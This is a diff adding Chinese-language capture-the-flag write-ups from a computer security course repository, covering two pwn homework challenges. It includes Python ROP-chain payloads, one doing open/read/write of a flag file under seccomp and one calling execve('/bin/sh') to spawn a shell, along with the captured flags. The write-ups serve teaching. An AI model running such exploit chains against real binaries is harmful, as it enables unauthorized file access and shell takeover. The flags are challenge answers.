@@ -29,13 +29,63 @@
     > ![pwn-rop2win-checksec](https://github.com/fdff87554/Computer-Security-2022/blob/main/images/pwn/pwn-rop2win-checksec.png)
 * 之後觀察一下 source，可以看到有加入 `seccomp` 這個 lib 來保護 syscall 的使用，可以看到只有 `open`, `read`, `write` 這幾個 syscall 可以做使用，其他的 syscall 都會被擋掉。
     > ![pwn-rop2win-source-syscall](https://github.com/fdff87554/Computer-Security-2022/blob/main/images/pwn/pwn-rop2win-source-syscall.png)
-* 首先先找到 `ROP_addr` 的位址，可以看到 `ROP_addr` 的位址是 ``。
-    > ![pwn-rop2win-pwndbg-ROP_addr](https://github.com/fdff87554/Computer-Security-2022/blob/main/images/pwn/pwn-rop2win-pwndbg-ROP_addr.png)
-
-## how2know - HW
+* 首先先找到 `ROP_addr` 的位址，可以看到 `ROP_addr` 的位址是 `4e3360`，`fn_addr` 則是 `4e3340`。
+    > ![pwn-rop2win-pwndbg-ROP_addr](https://github.com/fdff87554/Computer-Security-2022/blob/main/images/pwn/pwn-rop2win-pwndbg-ROP_addr-fn_addr.png)
+* 現在我們的目標很簡單，就是我們希望利用所有已知可用的操作來把 flag 給印出來，不是像其他題目一樣建立 `sh` 的原因是因為，這題的 `seccomp` 並沒有放行 `execve` 這個 syscall，所以我們只能用 `open`, `read`, `write` 這三個 syscall 來達成目的。
+* 對應到這題的 c code，我們知道了有三次的輸入機會，分別是給 filename，拿到 ROP 跟 overflow，因此對於我們來說我們這題就是建構 ROP 去指定出我們需要的 syscall。
+    * 操作 ROP 在沒有特殊的情況之下，我們會需要 control `rdi` (for param1), `rsi` (for param2), `rdx` (for param3) 跟 `rax` (for syscall number) 這四個 register，因此我們需要的 gadget 會是 `pop rdi; ret;`, `pop rsi; ret;`, `pop rdx; ret;` 跟 `pop rax; ret;` 這四個 gadget。
+    * 而這題因為並沒有 `pop rdx ; ret`，因此我們用 `pop rdx ; pop rbx ; ret` 取代，並注意要特別多 parse 一個 `rbx` 的值。
+* 看下面的 payload 可以看到我們主要的目標就是實作出 `open("/home/chal/flag", 0)`、`read(3, fn, 0x30)`、`write(1, fn, 0x30)` 這三個 syscall，其中 `read` 的 `fd` 會是 3 的原因是因為 read() 預設會開 0, 1, 2 三個 fd 也就是 stdin, stdout, stderr，因此我們猜測 fd: 3 會是我們的目標 fd。
+    > ```python=
+    > # open("/home/chal/flag", 0)
+    > # read(3, fn, 0x30)
+    > # write(1, fn, 0x30) - stdout
+    > ROP = flat(
+    >     # open(fd, 0)
+    >     pop_rdi_ret, fn_addr,
+    >     pop_rsi_ret, 0,
+    >     pop_rax_ret, 2,
+    >     syscall_ret,
+    >     
+    >     # read(fd, buf, 0x30)
+    >     pop_rdi_ret, 3, # guessed opened file fd
+    >     pop_rsi_ret, fn_addr,
+    >     pop_rdx_ret, 0x30, 0,
+    >     pop_rax_ret, 0,
+    >     syscall_ret,
+    >     
+    >     # write(1, buf, 0x30) --> stdout
+    >     pop_rdi_ret, 1, # stdout
+    >     pop_rax_ret, 1,
+    >     syscall_ret,
+    > )
+    > ```
+* 剩下的操作就直接看 paylaod，就可以看到我們的 flag: `FLAG{banana_72b302bf297a228a75730123efef7c41}`
 
 ## rop++ - HW
 
+* 這題是一題非常簡潔的 rop 題目，簡單來說就是要我們建構 rop，所以先用 `checksec` 檢查一下我們可以做哪些操作來取得我們要的資料，看到 Canary found / NX enabled / No PIE，所以可以直接查看 Code Address，直接先用 objdump 找 buf address 跟用 `ROPgadget` dump 出所有的 gadget，然後就可以開始建構 rop 了。
+* 因為我們的目標還是建立一個空間來儲存我們輸入的 `/bin/sh` string 並且交由 `execve` 去執行，因此我們需要分兩部，也就是建立好正常的 read() rop 來讀取我們的 `/bin/sh` string，然後再建立一個 rop 來執行 `execve`。
+* payload 如下，註解已經詳細說明行為了:
+    > ```python=
+    > ROP = flat(
+    >     # read(0, buf, 0x200)
+    >     pop_rdi_ret, 0,             # fd:0 - stdin
+    >     pop_rsi_ret, writable_addr, # buf - "/bin/sh" string
+    >     pop_rdx_ret, 0x7, 0,        # size
+    >     pop_rax_ret, 0,             # syscall - read
+    >     syscall_ret,
+    >     
+    >     # execve("/bin/sh", 0, 0)
+    >     pop_rdi_ret, writable_addr, # "/bin/sh"
+    >     pop_rsi_ret, 0,             # 0
+    >     pop_rdx_ret, 0, 0,          # 0
+    >     pop_rax_ret, 0x3b,          # syscall - execve
+    >     syscall_ret,
+    >)
+    > ```
+* 依照這樣的 Payload，我們只需要在輸入 `/bin/sh` 之後就可以 get shell 了，拿到 flag: `FLAG{chocolate_c378985d629e99a4e86213db0cd5e70d}`
+    > ![rop++-demo-image](https://github.com/fdff87554/Computer-Security-2022/blob/main/images/pwn/rop++-demo-image.png)
 
 
 ---
